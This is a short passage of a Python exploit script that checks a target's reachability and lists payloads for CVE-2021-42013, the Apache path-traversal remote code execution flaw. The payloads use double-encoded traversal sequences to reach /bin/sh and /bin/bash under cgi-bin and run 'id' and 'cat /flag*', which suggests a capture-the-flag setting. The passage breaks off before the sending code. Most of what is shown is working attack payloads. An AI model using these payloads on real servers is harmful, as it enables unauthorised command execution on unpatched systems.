    resp = requests.get(target, timeout=5)
    print(f"[OK] Connected - Status: {resp.status_code}")
except Exception as e:
    print(f"[FAIL] Cannot connect: {e}")
    sys.exit(1)

# Test CVE-2021-42013 exploits
exploits = [
    ("/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh", "echo;id;cat /flag*"),
    ("/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash", "echo;id;cat /flag*"),
    ("/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh", "A=|cat /flag*"),
    ("/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash", "A=|cat /flag*"),
]

print("\n[Step 2] Testing RCE exploits...")
